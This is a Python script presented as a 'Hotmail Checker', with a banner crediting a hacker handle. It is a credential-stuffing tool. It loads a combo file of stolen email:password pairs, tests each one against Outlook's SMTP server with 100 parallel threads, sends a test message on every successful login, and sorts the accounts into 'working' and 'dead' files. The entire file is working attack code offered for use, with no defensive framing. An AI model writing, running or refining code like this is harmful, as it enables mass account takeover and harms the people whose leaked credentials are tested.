import smtplib
import traceback
import concurrent.futures
from colorama import Fore

def banner():
    print(f"""{Fore.LIGHTYELLOW_EX}
 ____  __.____________________ ___ ___    _____  _________ ____  ___
|    |/ _|\__    ___/   _____//   |   \  /  _  \ \_   ___ \\   \/  /
|      <    |    |  \_____  \/    ~    \/  /_\  \/    \  \/ \     / 
|    |  \   |    |  /        \    Y    /    |    \     \____/     \ 
|____|__ \  |____| /_______  /\___|_  /\____|__  /\______  /___/\  \\
        \/                 \/       \/         \/        \/      \_/
{Fore.LIGHTBLUE_EX}Github: {Fore.LIGHTCYAN_EX}@ktshacx
{Fore.LIGHTBLUE_EX}Telegram: {Fore.LIGHTCYAN_EX}@ktshacx
{Fore.WHITE}
=====================================================================
                         {Fore.LIGHTRED_EX}Hotmail Checker{Fore.WHITE}
=====================================================================

""")

def check(subject, body, to_email, sender_email, sender_password):
    try:
        message = f"Subject: {subject}\n\n{body}"
        smtp_server = "smtp-mail.outlook.com"
        smtp_port = 587
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, to_email, message)
        server.quit()
        return None
    except smtplib.SMTPAuthenticationError:
        return "Authentication failed."
    except Exception as e:
        error_message = f"{str(e)}\n{traceback.format_exc()}"
        return error_message

def check_emailpass(emailpass, live_path, dead_path):
    e = str(emailpass).strip().split(':')
    c = check('Checking...', 'Checking...', e[0], e[0], e[1])
    if c is None:
        with open(live_path, 'a') as file:
            file.write(emailpass + '\n')
        print(Fore.CYAN, emailpass, Fore.WHITE, '->', Fore.LIGHTGREEN_EX, 'Login Success', Fore.WHITE)
    else:
        with open(dead_path, 'a') as file:
            file.write(emailpass + '\n')
        print(Fore.CYAN, emailpass, Fore.WHITE, '->', Fore.LIGHTRED_EX, c, Fore.WHITE)
    return

def main():
    banner()

    # Get paths from the user
    combo_path = input("Enter the path to your combo file (e.g., /storage/emulated/0/Download/emails.txt): ")
    live_path = input("Enter the path to save working accounts (e.g., /storage/emulated/0/Download/working.txt): ")
    dead_path = input("Enter the path to save dead accounts (e.g., /storage/emulated/0/Download/dead.txt): ")

    with open(combo_path, 'r') as file:
        emails = file.readlines()
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            results = list(executor.map(lambda emailpass: check_emailpass(emailpass, live_path, dead_path), emails))

if __name__ == "__main__":
    main()
    
